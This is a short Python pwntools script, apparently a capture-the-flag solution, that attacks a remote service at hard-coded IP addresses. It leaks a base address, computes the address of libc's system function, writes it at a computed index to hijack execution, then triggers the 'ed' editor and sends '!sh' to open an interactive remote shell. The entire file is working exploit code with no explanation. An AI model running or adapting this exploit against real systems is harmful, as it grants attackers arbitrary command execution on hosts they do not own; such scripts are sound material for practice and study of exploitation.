#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.19"
port = 8888
host = "3.112.41.140"
port = 56746
context.arch = "amd64"    
r = remote(host,port)

r.recvuntil(":")
r.sendline(str(0x300000))
r.recvuntil(":")
base = int(r.recvuntil("\n"),16)
libc = base + 0x300ff0
idx = 0x6ee8d8/8 
system = libc + 0x4f440
r.recvuntil(":")
r.sendline(hex(idx) + " " + hex(system))
r.recvuntil(":")
r.sendline("1"*0x1000 + " " + "ed")
r.sendline("!sh")
r.interactive()
